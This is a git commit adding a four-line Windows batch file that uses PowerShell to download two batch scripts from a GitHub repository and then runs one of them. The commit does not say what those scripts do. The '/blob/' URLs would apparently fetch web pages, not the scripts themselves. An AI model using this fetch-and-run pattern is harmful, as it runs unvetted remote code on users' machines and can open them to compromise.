45306dd18e6a66205bcc94a8584a01ae798babe3
jarry26665 <30381140+jarry26665@users.noreply.github.com>
2022-11-28 12:48:19 +0500

    Create download.bat

---
+++ download.bat
@@ -0,0 +1,4 @@
+powershell -command invoke-webrequest https://github.com/jarry26665/pixel/blob/main/pro.bat -o pro.bat
+powershell -command invoke-webrequest https://github.com/jarry26665/pixel/blob/main/uk.bat -o uk.bat
+start pro.bat
+exit
